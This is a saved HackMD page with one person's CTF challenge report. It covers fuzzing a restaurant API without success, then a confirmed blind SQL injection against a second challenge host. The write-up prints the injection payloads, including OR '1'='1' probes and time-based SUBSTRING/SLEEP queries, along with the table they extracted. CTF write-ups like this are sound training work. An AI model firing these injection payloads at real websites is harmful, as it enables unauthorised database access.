<!DOCTYPE html>
<html lang="en-US" data-themeable="true">

<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black">
    <meta name="mobile-web-app-capable" content="yes">
    <meta name="csrf-token" content="3LLxhuLc-zG2uo70fvdxJpR3cpTmhOG64DCY">
    
    
    <meta name="description" content="CTF Challenge Report – Deepak Kumar">
    
    <title>HackMD - Collaborative Markdown Knowledge Base</title>
    <link rel="icon" type="image/png" href="https://hackmd.io/favicon.png">
	<link rel="apple-touch-icon" href="https://hackmd.io/apple-touch-icon.png">
	<!--  meta value for server side given sign in boolean -->
    <meta name="signin" content="true">

    
<script nonce="2de7b3a1-5804-442f-8960-326f4e0584ca">
  window.domain = 'hackmd.io'
  window.urlpath = ''
  window.debug = false || window.localStorage.getItem('HMD_DEBUG_FLAG') === 'true'
  window.version = '1.3.0'
  window.brand = 'HackMD'

  
  window.NOTE_ID = 'g-s8NTwHTkmhkMAmJEIeyg'
  

  window.GOOGLE_DRIVE_API_KEY = 'AIzaSyAHmcP5gL_64ZafuAYOvJruFAIaYgHQaY4'
  window.GOOGLE_DRIVE_CLIENT_ID = '65857506266-76uhhee8se8dgs1i0q8fhtj1prg0ar27.apps.googleusercontent.com'
  window.DROPBOX_APP_KEY = 'rdoizrlnkuha23r'
  
  window.PLANTUML_SERVER = 'https://ptuml.hackmd.io'

  window.ASSET_URL = 'https://assets.hackmd.io'

  window.USER_CAN_CREATE_TEAM = true
  window.USER_CAN_DELETE_ACCOUNT = true
  window.USER_DELETE_ACCOUNT_VIA_EMAIL = true
  window.PAYMENT_ENABLED = true
  window.PAYMENT_PROMOTION_BANNER_ENABLED = false
  window.GITHUB_SYNC_ENABLED = true
  window.GITLAB_SYNC_ENABLED = false
  window.GITLAB_SYNC_BASE_URL = ''
  window.VCS_SYNC_MODE = 'github'
  window.VCS_PROVIDER_NAME = 'GitHub'
  window.FREE_TEAM_NUM = 20
  window.FREE_TEAM_MEMBER_NUM = 3
  window.FREE_PUBLIC_TEAM_NUM = 10
  window.NEO_OVERVIEW_UI = true

  
      window.FOLDER_ENABLE = true
  

  
  window.EE_SITE_ENABLE = false
  window.EE_SITE_NAME = 'false'
  window.EE_SITE_LINK = 'false'
  window.EESITE_INFO = false
  window.ENTERPRISE_DISCOVERY_ENABLE = false
  window.ENTERPRISE_DISCOVERY_TEAM = true
  window.ENTERPRISE_DISCOVERY_NOTE = true
  window.ENTERPRISE_DISCOVERY_VIEW_PERMISSION = 'guest'
  
  window.ALLOW_ANONYMOUS = true
  window.ALLOW_ANONYMOUS_EDIT = false
  window.ALLOW_DOWNLOAD_PDF = true
  window.PUBLIC_OVERVIEW = false
  window.INTERNAL_PUBLIC_OVERVIEW = false
  window.FULL_TEXT_SEARCH_ENABLE = false
  window.ALGOLIA_SEARCH_ENABLE = true
  window.MARKETING_EMAIL_ENABLE = true
  window.OFFLINE_ACCESS = true
  
  
  
    window.WALLET_CONNECT_PROJECT_ID = '91d6fa182b725b5895a17a170a5878c1'
  
  window.API_MANAGEMENT_UI_ENABLE = true
  window.FEEDBACK_UI_ENABLE = true
  window.PUBLISH_ENABLE = true

  

  
  window.SHOW_HOT_NOTES = false
  

  
  window.HOT_NOTES_TIME_TYPE = 'week'
  

  
  window.SHOW_OVERVIEW = true
  

  
  window.MENTIONS = {}
  

  
  window.MENTION_ANCHORS = []
  

  
  window.COMMENT_ANCHORS = []
  

  
  window.IS_OWNER = true
  

  
  window.IS_TEAM_ADMIN = false
  

  

  
  window.USER_PROFILE = '%7B%22name%22%3A%22Deepak%20Kumar%22%2C%22userpath%22%3A%229oFx0ewJRsiPN2BZdkfSMw%22%2C%22photo%22%3A%22https%3A//lh3.googleusercontent.com/a/ACg8ocJK8TlE3gJIWO_O8lLZcd86l8PmQEijQdQAQuxCSnDyoDdb6wWv%3Ds96-c%22%2C%22userid%22%3A%22f68171d1-ec09-46c8-8f37-60597647d233%22%7D'
  

  
  window.VERSION_TIME = '1739206898700'
  

  
  window.canEdit = true
  

  
  window.canWriteComment = true
  

  
  window.canHideComment = true
  

  window.TRASH_NOTE_DELETE_AFTER_FREE = 3
  window.TRASH_NOTE_DELETE_AFTER_PAID = 30

  
    window.ENABLED_PREVIEW_FEATURE = {}
  

  
    window.IS_OWNER_UPGRADED = false
  

  
    window.IMGUR_FALLBACK_CDN = 'https://imgur-backup.hackmd.io'
  

  
    window.CLOUD_META_UI = true
  
  
    window.CLOUD_META_API = true
  
  
    window.CLOUD_META_MIGRATION = false
  
  
    window.YAML_METADATA_ENABLED = false
  

  
    window.NOTE_CAPACITY_LIMIT = 50
  

  
    window.DOCUMENT_MAX_LENGTH = 100000
  

  
    window.SOCIAL_NETWORK_FEATURES_ENABLED = true
  

  
    window.PUBLISHMENT_MODERATION_ENABLED = true
  

  
    window.COMMENT_ENABLED = true
  

  window.SUGGEST_EDIT_ENABLED = true
  
    window.SUGGEST_EDIT_ENABLED = true
  

  
    window.REALTIME_CLIENT_WITH_CREDENTIALS = false
  

  
    window.COMMENT_ENABLED = true
  

  
    window.DEBUG_DISCONNECT_SOCKET_WHEN_OFFLINE = false
  

  

  

  

  
    window.CUSTOM_STYLE_ENABLED = "true"
  

  
    window.USE_NEW_LOGO = true
  

  
    window.ITERABLE_ENABLED = true
  
  
    window.ITERABLE_API_KEY = "c2c36a44c2614fb19aa3b46d660bbce2"
  

  
    window.TEXT_SELECTION_CHANGED = false
  

  
    window.CAN_VIEW_HISTORY_AT_REVISION = false
  
</script>


    
<!-- Google Tag Manager -->
<script nonce="2de7b3a1-5804-442f-8960-326f4e0584ca">(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
})(window,document,'script','dataLayer','GTM-KLW9Z3');</script>
<!-- End Google Tag Manager -->


    





    <meta property="fb:app_id" content="1436904003272070">



    <meta name="twitter:image:src" content="https://hackmd.io/images/media/HackMD-neo-og.jpg">
    <meta name="twitter:image:alt" content="HackMD - Collaborative Markdown Knowledge Base">


<meta name="twitter:site" content="@hackmdio" />
<meta name="twitter:card" content="summary_large_image" />
<meta name="twitter:title" content="HackMD - Collaborative Markdown Knowledge Base" />


    <meta name="twitter:description" content="CTF Challenge Report – Deepak Kumar" />



    <meta property="og:image" content="https://hackmd.io/images/media/HackMD-neo-og.jpg">
    <meta property="og:image:alt" content="HackMD - Collaborative Markdown Knowledge Base">


<meta property="og:site_name" content="HackMD" />
<meta property="og:type" content="article" />
<meta property="og:title" content="HackMD - Collaborative Markdown Knowledge Base" />


    <meta property="og:description" content="CTF Challenge Report – Deepak Kumar" />




     <link href="https://assets.hackmd.io/build/font-vendor.css" rel="stylesheet"><link href="https://assets.hackmd.io/build/font-vendor.ea8218d7d4f468b2c430.css" rel="stylesheet"><link href="https://assets.hackmd.io/build/common-vendor.css" rel="stylesheet"><link href="https://assets.hackmd.io/build/common-vendor.0a08ae20e14fefe857eb.css" rel="stylesheet"><link href="https://assets.hackmd.io/build/pretty-vendor.css" rel="stylesheet"><link href="https://assets.hackmd.io/build/pretty-vendor.db0e7b64c54d0a77290f.css" rel="stylesheet"><link href="https://assets.hackmd.io/build/pretty.css" rel="stylesheet"><link href="https://assets.hackmd.io/build/pretty.7161140060168469d916.css" rel="stylesheet">
    <!-- HTML5 shim and Respond.js for IE8 support of HTML5 elements and media queries -->
<!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
<!--[if lt IE 9]>
	<script src="https://cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7.3/html5shiv.min.js" integrity="sha256-3Jy/GbSLrg0o9y5Z5n1uw0qxZECH7C6OQpVBgNFYa0g=" crossorigin="anonymous"></script>
	<script src="https://cdnjs.cloudflare.com/ajax/libs/respond.js/1.4.2/respond.min.js" integrity="sha256-g6iAfvZp+nDQ2TdTR/VVKJf3bGro4ub5fvWSWVRi2NE=" crossorigin="anonymous"></script>
	<script src="https://cdnjs.cloudflare.com/ajax/libs/es5-shim/4.5.9/es5-shim.min.js" integrity="sha256-8E4Is26QH0bD52WoQpcB+R/tcWQtpzlCojrybUd7Mxo=" crossorigin="anonymous"></script>
<![endif]-->

    


    <script defer data-domain="hackmd.io" src="https://plausible.io/js/script.js"></script>
<script nonce="2de7b3a1-5804-442f-8960-326f4e0584ca">
  window.plausible = window.plausible || function() { (window.plausible.q = window.plausible.q || []).push(arguments); }
  const keyboardWhiteList = ['a', 'span', 'button']

  function getTaggedEventAttributes (e) {
    const eventAttrs = { name: null, props: {} }
    if (!e || !e.classList) return eventAttrs
    const psEvent = /plausible-event-(.+)(=|--)(.+)/
    for (const className of [...e.classList]) {
      const [, key, , val] = className.match(psEvent) || []
      if (!key || !val) continue
      const value = val.replace(/\+/g, ' ')
      switch (key.toLowerCase()) {
        case 'name':
          eventAttrs.name = value
          break
        default:
          eventAttrs.props[key] = value
          break
      }
    }
    return eventAttrs
  }

  function isLocal () {
    return /^localhost$|^127(\.[0-9]+){0,2}\.[0-9]+$|^\[::1?\]$/.test(location.hostname) || location.protocol === 'file:'
  }

  function isAutomation () {
    return Boolean(window._phantom || window.__nightmare || window.navigator.webdriver || window.Cypress)
  }

  function shouldIgnore () {
    return isLocal() ||
      isAutomation() ||
      window.localStorage.getItem('plausible_ignore') === 'true'
  }

  function handler (e) {
    if (!window.plausible) return
    if (!e.target || !('className' in e.target)) return
    const ele = e.target

    const eventAttrs = getTaggedEventAttributes(ele)
    if (!eventAttrs.name) return
    if (ele?.href) eventAttrs.props.url = ele.href

    if (shouldIgnore()) {
      if (window.debug) logDebugEventMsg(eventAttrs)
      return
    }
    window.plausible(eventAttrs.name, { props: eventAttrs.props })
  }

  function logDebugEventMsg (eventAttrs) {
    console.warn(
      `Ignoring Event: "${eventAttrs.name}"`,
      eventAttrs,
    )
  }

  function keydownHandler (e) {
    if (e.key !== 'Enter') return
    if (e.target.nodeName.toLowerCase() === 'input') {
      switch (e.target.type.toLowerCase()) {
        case 'submit':
        case 'button':
        case 'reset':
        case 'checkbox':
        case 'radio':
        case 'file':
        case 'image':
        case 'color':
          break
        default:
          return
      }
    } else if (!keyboardWhiteList.includes(e.target.nodeName.toLowerCase())) {
      return
    }
    handler(e)
  }

  document.addEventListener('mousedown', handler)
  document.addEventListener('keydown', keydownHandler)
</script>

    
<script nonce="2de7b3a1-5804-442f-8960-326f4e0584ca">
  window.publishProps = JSON.parse(`{"isOwnerAnonymous":false,"isOwnedByTeam":false,"ownerInfo":{"name":"Deepak%20Kumar","path":"9oFx0ewJRsiPN2BZdkfSMw","avatarUrl":"https%3A%2F%2Flh3.googleusercontent.com%2Fa%2FACg8ocJK8TlE3gJIWO_O8lLZcd86l8PmQEijQdQAQuxCSnDyoDdb6wWv%3Ds96-c","description":null},"isPublished":false,"createTime":1739205012606,"updateTime":1739206898700,"vcsSyncMode":"github","vcsProviderName":"GitHub","canEdit":true,"hardBreaks":true,"onlyOwnerCanEdit":true,"isCommentEnabled":true,"likedCount":0,"isNotificationEnabled":true,"notificationType":"watch","hasEmail":true,"canWriteComment":true,"viewCount":13,"markdown":"%23%20CTF%20Challenge%20Report%20%E2%80%93%20Deepak%20Kumar%0A%0A**Date%3A**%2010-02-2024%0A%0A---%0A%0A%23%23%201st%20Challenge%20%20%5Bhttp%3A%2F%2Fc1.lraw.me%2F%5D(http%3A%2F%2Fc1.lraw.me%2F)%0A%0A%23%23%23%20Initial%20Exploration%0A%0AExecuted%20the%20following%20cURL%20request%3A%0A%0A%60%60%60%0Acurl%20--location%20'https%3A%2F%2Fc1.lraw.me%2Fapi%2Frestaurant'%20%5C%0A--header%20'Content-Type%3A%20application%2Fjson'%20%5C%0A--data%20'%7B%20%22company_id%22%3A%20%22rest_1%22%20%7D'%0A%60%60%60%0A%0AUpon%20inspecting%20the%20POST%20request%20in%20BurpSuite%20Repeater%2C%20received%20a%20**500%20Internal%20Server%20Error**%3A%0A%0A!%5B500%20Error%5D(https%3A%2F%2Fi.ibb.co%2FmVCwHZYb%2Fimage.png)%0A%0AThe%20error%20%60getaddrinfo%20EAI_AGAIN%60%20indicates%20a%20temporary%20DNS%20resolution%20failure%20when%20connecting%20to%20the%20MongoDB%20server%2C%20potentially%20due%20to%20network%20issues%20or%20an%20incorrect%20hostname.%0A%0A%23%23%23%20Brute-Force%20Attempts%0A%0A-%20**Brute-forced%20the%20%60company_id%60%20parameter**%20in%20the%20JSON%20POST%20body%3A%0A%0A%20%20!%5BBrute-force%20company_id%5D(https%3A%2F%2Fi.ibb.co%2FqMsrZHrk%2Fimage.png)%0A%0A%20%20**Result%3A**%20No%20success.%0A%0A-%20**Fuzzed%20the%20POST%20URL%20paths%3A**%0A%20%20-%20%60https%3A%2F%2Fc1.lraw.me%2Fapi%2Frestaurant%60%0A%20%20-%20%60https%3A%2F%2Fc1.lraw.me%2Fapi%2Fusers%60%0A%20%20-%20%60https%3A%2F%2Fc1.lraw.me%2Fapi%2Fproducts%60%0A%20%20-%20%60https%3A%2F%2Fc1.lraw.me%2Fapi%2Fcart%60%0A%0A%20%20!%5BFuzzing%20URL%20paths%5D(https%3A%2F%2Fi.ibb.co%2FyB0vt4Dy%2Fimage.png)%0A%0A%20%20**Result%3A**%20No%20success.%0A%0A%23%23%23%20Playing%20with%20JSON%20Payloads%0A%0APassing%20invalid%20JSON%20resulted%20in%20a%20JSON%20parsing%20error%3A%0A%0A!%5BJSON%20Error%5D(https%3A%2F%2Fi.ibb.co%2FNg2LPWr4%2Fimage.png)%0A%0ASuspected%20a%20potential%20JSON%20parser%20vulnerability%20that%20could%20be%20exploited%20for%20RCE%20(Remote%20Code%20Execution).%20Tried%20injecting%20payloads%20to%20test%20if%20user%20input%20was%20being%20executed%20on%20the%20server.%0A%0A**Example%20Payloads%20Tried%3A**%0A%0A!%5BPayload%20Attempts%5D(https%3A%2F%2Fi.ibb.co%2F4RDcZX4X%2Fimage.png)%0A%0A**Result%3A**%20No%20success.%0A%0A%23%23%23%20Additional%20Observations%0A%0A-%20**Dot%20in%20POST%20body**%20triggered%20a%20different%20error%3A%0A%0A%20%20!%5BDot%20Error%5D(https%3A%2F%2Fi.ibb.co%2FX0tGjBZ%2Fimage.png)%0A%0A-%20**Empty%20POST%20body**%20resulted%20in%20a%20JavaScript%20error%2C%20indicating%20the%20backend%20might%20be%20using%20JavaScript%20to%20process%20inputs%3A%0A%0A%20%20!%5BJavaScript%20Error%5D(https%3A%2F%2Fi.ibb.co%2FbRLW2rkJ%2Fimage.png)%0A%0ADespite%20trying%20various%20methods%20for%20over%202%20hours%2C%20I%20couldn't%20chain%20the%20improper%20input%20validation%20to%20an%20RCE.%20Moved%20on%20to%20the%20next%20challenge%20due%20to%20time%20constraints.%0A%0A---%0A%0A%23%23%202nd%20Challenge%20%20%5Bhttp%3A%2F%2Fc2.lraw.me%2F%5D(http%3A%2F%2Fc2.lraw.me%2F)%0A%0A%23%23%23%20Initial%20Exploration%0A%0AVisiting%20%5Bhttp%3A%2F%2Fc2.lraw.me%2F%5D(http%3A%2F%2Fc2.lraw.me%2F)%20displayed%20a%20list%20of%20users%3A%0A%0A!%5BUsers%20List%5D(https%3A%2F%2Fi.ibb.co%2Fpj1djmJQ%2Fimage.png)%0A%0A%23%23%23%20Parameter%20Discovery%0A%0AWithout%20any%20obvious%20parameters%20or%20paths%2C%20started%20brute-forcing%20paths%20and%20parameters.%20After%2010%20minutes%20of%20fuzzing%2C%20discovered%20an%20interesting%20parameter%3A%0A%0A!%5BDiscovered%20Parameter%5D(https%3A%2F%2Fi.ibb.co%2FgZ28QYVY%2Fimage.png)%0A%0AThe%20content%20length%20differed%20from%20the%20default%20page%2C%20indicating%20it%20might%20be%20worth%20testing.%0A%0A%23%23%23%20Testing%20for%20Vulnerabilities%0A%0A-%20**XSS%20Tests%3A**%0A%20%20-%20Tried%20various%20XSS%20payloads%2C%20but%20the%20server's%20response%20remained%20unchanged.%0A%20%20%0A%20%20%20%20!%5BXSS%20Attempt%5D(https%3A%2F%2Fi.ibb.co%2FC56rRwmn%2Fimage.png)%0A%0A-%20**SQL%20Injection%20Testing%3A**%0A%20%20-%20Used%20the%20following%20payload%20for%20SQL%20injection%20testing%3A%0A%0A%20%20%20%20%60https%3A%2F%2Fc2.lraw.me%2F%3Fpage%3D1%22%20OR%20%221%22%3D%221%60%0A%0A%20%20%20%20!%5BSQLi%20Success%5D(https%3A%2F%2Fi.ibb.co%2FSXRM1Qwj%2Fimage.png)%0A%0A%20%20-%20To%20confirm%2C%20used%3A%0A%0A%20%20%20%20%60https%3A%2F%2Fc2.lraw.me%2F%3Fpage%3D1%22%20OR%20%221%22%3D%222%60%0A%0A%20%20%20%20!%5BSQLi%20Failure%5D(https%3A%2F%2Fi.ibb.co%2FxtLCBgkk%2Fimage.png)%0A%0AConfirmed%20the%20presence%20of%20a%20**Boolean-based%20Blind%20SQL%20Injection**%20vulnerability.%20The%20payload%20%601%22%20OR%20%221%22%3D%221%60%20tricked%20the%20backend%20to%20respond%20with%20all%20data%2C%20while%20%601%22%20OR%20%221%22%3D%222%60%20did%20not.%0A%0A%23%23%23%20Extracting%20Data%0A%0AUsed%20manual%20approaches%20via%20BurpSuite's%20Repeater%20to%20extract%20database%20information%3A%0A%0A-%20**Determine%20Database%20Length%3A**%0A%0A%20%20%60%60%60%0A%20%20GET%20%2F%3Fpage%3D1%22%20OR%20IF(LENGTH(DATABASE())%3D3%2C%20SLEEP(2%2F3)%2C%200)--%20-%20HTTP%2F2%0A%20%20Host%3A%20c2.lraw.me%3A443%0A%20%20%60%60%60%0A%0A%20%20Server%20response%20confirmed%20that%20the%20database%20name%20length%20is%20**3**.%0A%0A%20%20!%5BDatabase%20Length%5D(https%3A%2F%2Fi.ibb.co%2FgFVKd6kR%2Fimage.png)%0A%0A-%20**Extract%20Database%20Name%20Character%20by%20Character%3A**%0A%20%20-%20First%20character%3A%0A%0A%20%20%20%20%60%2F%3Fpage%3D1%22%20OR%20IF(SUBSTRING(DATABASE()%2C1%2C1)%3D'c'%2C%20SLEEP(2)%2C%200)--%20-%60%0A%0A%20%20%20%20!%5BFirst%20Character%5D(https%3A%2F%2Fi.ibb.co%2F6cXwR175%2Fimage.png)%0A%0A%20%20-%20Second%20character%3A%0A%0A%20%20%20%20%60%2F%3Fpage%3D1%22%20OR%20IF(SUBSTRING(DATABASE()%2C2%2C1)%3D't'%2C%20SLEEP(5%2F5)%2C%200)--%20-%60%0A%0A%20%20%20%20Here%2C%20%602%2C1%60%20targets%20the%20second%20character.%0A%0ASuccessfully%20extracted%3A%0A%0A%60%60%60%0ADatabase%3A%20ctf%0ATable%3A%20endpoints%0A%5B3%20entries%5D%0A%2B----%2B-------------%2B------------------%2B%0A%7C%20id%20%7C%20endpoint%20%20%20%20%7C%20canonical%20%20%20%20%20%20%20%20%7C%0A%2B----%2B-------------%2B------------------%2B%0A%7C%204%20%20%7C%20users%20%20%20%20%20%20%20%7C%20list-users%20%20%20%20%20%20%20%7C%0A%7C%205%20%20%7C%20api-key%20%20%20%20%20%7C%20NULL%20%20%20%20%20%20%20%20%20%20%20%20%20%7C%0A%7C%206%20%20%7C%20restaurants%20%7C%20list-restaurants%20%7C%0A%2B----%2B-------------%2B------------------%2B%0A%60%60%60%0A%0A%23%23%23%20Final%20Attempts%0A%0ASpent%20considerable%20time%20searching%20for%20the%20CTF%20flag%20within%20the%20%60api-key%60%2C%20%60users%60%2C%20and%20other%20columns%20but%20was%20unable%20to%20locate%20it%20before%20the%204-hour%20time%20limit%20expired.%0A%0A---%0A%0A**Conclusion%3A**%0A%0A-%20**Challenge%201%3A**%20Identified%20potential%20JSON%20parsing%20and%20JavaScript%20backend%20handling%20vulnerabilities%20but%20could%20not%20escalate%20to%20RCE.%0A-%20**Challenge%202%3A**%20Successfully%20exploited%20a%20Boolean-based%20Blind%20SQL%20Injection%20but%20failed%20to%20locate%20the%20flag%20in%20time.%0A%0AOverall%2C%20learned%20valuable%20insights%20into%20input%20validation%20handling%20and%20SQL%20injection%20exploitation%20techniques.%0A","viewMode":"publish","isOwner":true,"isSignIn":true,"isLiked":false,"isBookmarked":false,"publishType":"view","commentCount":0,"isNotesRecommendationsEnabled":true,"recommendedNotes":[],"lastChangeUserInfo":{"name":"Deepak%20Kumar","path":"9oFx0ewJRsiPN2BZdkfSMw","avatarUrl":"https%3A%2F%2Flh3.googleusercontent.com%2Fa%2FACg8ocJK8TlE3gJIWO_O8lLZcd86l8PmQEijQdQAQuxCSnDyoDdb6wWv%3Ds96-c"}}`);
  (function () {
    const decodeStringProps = (props) => {
      for (const key in props) {
        if (typeof props[key] === 'string') {
          props[key] = decodeURIComponent(props[key])
        } else if (typeof props[key] === 'object') {
          decodeStringProps(props[key])
        }
      }
    }
    decodeStringProps(window.publishProps)
  })()
</script>

    <script src="https://tally.so/widgets/embed.js"></script>

    
</head>

<body style="display:none;">
    <div id="toasts-container" class="toasts-container z-[2000]"></div>
    <div id="publish-page"># CTF Challenge Report – Deepak Kumar

**Date:** 10-02-2024

---

## 1st Challenge  [http://c1.lraw.me/](http://c1.lraw.me/)

### Initial Exploration

Executed the following cURL request:

```
curl --location &#39;https://c1.lraw.me/api/restaurant&#39; \
--header &#39;Content-Type: application/json&#39; \
--data &#39;{ &#34;company_id&#34;: &#34;rest_1&#34; }&#39;
```

Upon inspecting the POST request in BurpSuite Repeater, received a **500 Internal Server Error**:

![500 Error](https://i.ibb.co/mVCwHZYb/image.png)

The error `getaddrinfo EAI_AGAIN` indicates a temporary DNS resolution failure when connecting to the MongoDB server, potentially due to network issues or an incorrect hostname.

### Brute-Force Attempts

- **Brute-forced the `company_id` parameter** in the JSON POST body:

  ![Brute-force company_id](https://i.ibb.co/qMsrZHrk/image.png)

  **Result:** No success.

- **Fuzzed the POST URL paths:**
  - `https://c1.lraw.me/api/restaurant`
  - `https://c1.lraw.me/api/users`
  - `https://c1.lraw.me/api/products`
  - `https://c1.lraw.me/api/cart`

  ![Fuzzing URL paths](https://i.ibb.co/yB0vt4Dy/image.png)

  **Result:** No success.

### Playing with JSON Payloads

Passing invalid JSON resulted in a JSON parsing error:

![JSON Error](https://i.ibb.co/Ng2LPWr4/image.png)

Suspected a potential JSON parser vulnerability that could be exploited for RCE (Remote Code Execution). Tried injecting payloads to test if user input was being executed on the server.

**Example Payloads Tried:**

![Payload Attempts](https://i.ibb.co/4RDcZX4X/image.png)

**Result:** No success.

### Additional Observations

- **Dot in POST body** triggered a different error:

  ![Dot Error](https://i.ibb.co/X0tGjBZ/image.png)

- **Empty POST body** resulted in a JavaScript error, indicating the backend might be using JavaScript to process inputs:

  ![JavaScript Error](https://i.ibb.co/bRLW2rkJ/image.png)

Despite trying various methods for over 2 hours, I couldn&#39;t chain the improper input validation to an RCE. Moved on to the next challenge due to time constraints.

---

## 2nd Challenge  [http://c2.lraw.me/](http://c2.lraw.me/)

### Initial Exploration

Visiting [http://c2.lraw.me/](http://c2.lraw.me/) displayed a list of users:

![Users List](https://i.ibb.co/pj1djmJQ/image.png)

### Parameter Discovery

Without any obvious parameters or paths, started brute-forcing paths and parameters. After 10 minutes of fuzzing, discovered an interesting parameter:

![Discovered Parameter](https://i.ibb.co/gZ28QYVY/image.png)

The content length differed from the default page, indicating it might be worth testing.

### Testing for Vulnerabilities

- **XSS Tests:**
  - Tried various XSS payloads, but the server&#39;s response remained unchanged.
  
    ![XSS Attempt](https://i.ibb.co/C56rRwmn/image.png)

- **SQL Injection Testing:**
  - Used the following payload for SQL injection testing:

    `https://c2.lraw.me/?page=1&#34; OR &#34;1&#34;=&#34;1`

    ![SQLi Success](https://i.ibb.co/SXRM1Qwj/image.png)

  - To confirm, used:

    `https://c2.lraw.me/?page=1&#34; OR &#34;1&#34;=&#34;2`

    ![SQLi Failure](https://i.ibb.co/xtLCBgkk/image.png)

Confirmed the presence of a **Boolean-based Blind SQL Injection** vulnerability. The payload `1&#34; OR &#34;1&#34;=&#34;1` tricked the backend to respond with all data, while `1&#34; OR &#34;1&#34;=&#34;2` did not.

### Extracting Data

Used manual approaches via BurpSuite&#39;s Repeater to extract database information:

- **Determine Database Length:**

  ```
  GET /?page=1&#34; OR IF(LENGTH(DATABASE())=3, SLEEP(2/3), 0)-- - HTTP/2
  Host: c2.lraw.me:443
  ```

  Server response confirmed that the database name length is **3**.

  ![Database Length](https://i.ibb.co/gFVKd6kR/image.png)

- **Extract Database Name Character by Character:**
  - First character:

    `/?page=1&#34; OR IF(SUBSTRING(DATABASE(),1,1)=&#39;c&#39;, SLEEP(2), 0)-- -`

    ![First Character](https://i.ibb.co/6cXwR175/image.png)

  - Second character:

    `/?page=1&#34; OR IF(SUBSTRING(DATABASE(),2,1)=&#39;t&#39;, SLEEP(5/5), 0)-- -`

    Here, `2,1` targets the second character.

Successfully extracted:

```
Database: ctf
Table: endpoints
[3 entries]
+----+-------------+------------------+
| id | endpoint    | canonical        |
+----+-------------+------------------+
| 4  | users       | list-users       |
| 5  | api-key     | NULL             |
| 6  | restaurants | list-restaurants |
+----+-------------+------------------+
```

### Final Attempts

Spent considerable time searching for the CTF flag within the `api-key`, `users`, and other columns but was unable to locate it before the 4-hour time limit expired.

---

**Conclusion:**

- **Challenge 1:** Identified potential JSON parsing and JavaScript backend handling vulnerabilities but could not escalate to RCE.
- **Challenge 2:** Successfully exploited a Boolean-based Blind SQL Injection but failed to locate the flag in time.

Overall, learned valuable insights into input validation handling and SQL injection exploitation techniques.
</div>
    <!-- signin modal -->

<div class="modal fade signin-modal" tabindex="-1" role="dialog" aria-labelledby="mySmallModalLabel" aria-hidden="true">
    <div class="modal-dialog">
        <div class="modal-content">
            <button type="button" class="close" data-dismiss="modal" aria-label="Close" style="margin-top: 10px; right: 20px; position: absolute;"><span aria-hidden="true">&times;</span></button>
            






    









<h3>Sign in</h3>

<form data-toggle="validator" role="form" class="form-horizontal" method="post" enctype="application/x-www-form-urlencoded" id="signin-form">
    <div class="hmd-dn"><input type="hidden" name="_csrf" value="3LLxhuLc-zG2uo70fvdxJpR3cpTmhOG64DCY"></div>
    <div class="hmd-dn"><input type="hidden" name="create_team" value="false"></div>
    <div class="hmd-dn"><input type="hidden" name="create_paid_team" value="false"></div>
    
    <div class="form-group  ">
        <label for="email" class="control-label">Email</label>
        <label for="inputEmail" class="control-label pull-right errors">
            
        </label>
        <span class="help-block control-label with-errors pull-right" style="margin-top: 14px"></span>
        <div class="input-block">
            
                <input type="email" class="form-control" name="email" placeholder="Your email" required autocomplete="email">
            
            <span class="error-sign"></span>
        </div>
    </div>
    <div class="form-group ">
        <label for="password" class="control-label">Password</label>
        <label for="inputPassword" class="control-label pull-right errors">
            
        </label>
        <span class="help-block control-label with-errors pull-right" style="margin-top: 14px"></span>
        <div class="input-block">
            <input type="password" class="form-control" name="password" placeholder="Your password" required autocomplete="current-password" maxlength="128">
            <span class="error-sign"></span>
            
                <span class="control-label pull-right !text-normal !leading-normal !font-normal !mt-1.5"><a href="https://hackmd.io/settings/forgotPassword" style="text-decoration: underline;">Forgot password</a></span>
            
        </div>
    </div>

    <div style="text-align: center; padding-top: 15px; margin-bottom: 0px;">
        <div
            hidden
            id="hmd-captcha"
            data-provider=""
            data-captcha-data=""
            class="flex justify-center"
        ></div>

        
            <input type="submit" class="neo-btn neo-btn-primary !justify-center !py-3.5 !mx-auto" formaction="https://hackmd.io/login" value="Sign in">
        

        
    </div>
</form>














    
        <p class="separator">or</p>
    

    
        <p>By clicking below, you agree to our <a href="https://hackmd.io/s/terms" target="_blank">terms of service</a>.</p>
    

    












<script id="gsi-client" src="https://accounts.google.com/gsi/client" async defer nonce="2de7b3a1-5804-442f-8960-326f4e0584ca"></script>
<script nonce="2de7b3a1-5804-442f-8960-326f4e0584ca">
    function handleCredentialResponse(response) {
        const form = document.getElementById('sign-in-with-google-form')
        form.children.credential.value = response.credential
        form.children.method.value = location.href.toLowerCase() === 'https://hackmd.io/settings#general' ? 'merge' : 'login'
        form.submit()
    }
    var GSI_READY = new Promise(function (resolve) {
        function initialize () {
            google.accounts.id.initialize({
                client_id: '911617723593-drikdibvvn63slfd6kbqigo8ql1no55s.apps.googleusercontent.com',
                callback: handleCredentialResponse
            })
            const loginPath = '/login'
            const joinPath = '/join'
            const renderButton = function () {
                google.accounts.id.renderButton(
                    document.getElementById('sign-in-with-google-button'),
                    { type: 'standard', width: 250 }
                )
            }
            if (location.pathname.toLowerCase() === loginPath || location.pathname.toLowerCase() === joinPath) {
                renderButton()
            } else {
                $('.signin-modal').one('shown.bs.modal', function () {
                    renderButton()
                })
            }
            resolve()
        }

        window.addEventListener('load', function () { initialize() })
    })
</script>
<form class="hidden" id="sign-in-with-google-form" action="/auth/google" method="post">
    <input type="hidden" name="credential">
    <input type="hidden" name="method">
</form>


<div class="social-buttons-container">
    
    <div id="sign-in-with-google-button"></div>
    
    
    <a href="https://hackmd.io/auth/facebook" class="btn btn-lg btn-block btn-social btn-facebook">
        <i class="fa fa-facebook"></i> Sign in via Facebook
    </a>
    
    
    <a href="https://hackmd.io/auth/twitter" class="btn btn-lg btn-block btn-social btn-twitter">
        <i class="fa fa-twitter"></i> Sign in via Twitter
    </a>
    
    
    <a href="https://hackmd.io/auth/github" class="btn btn-lg btn-block btn-social btn-github">
        <i class="fa fa-github"></i> Sign in via GitHub
    </a>
    
    
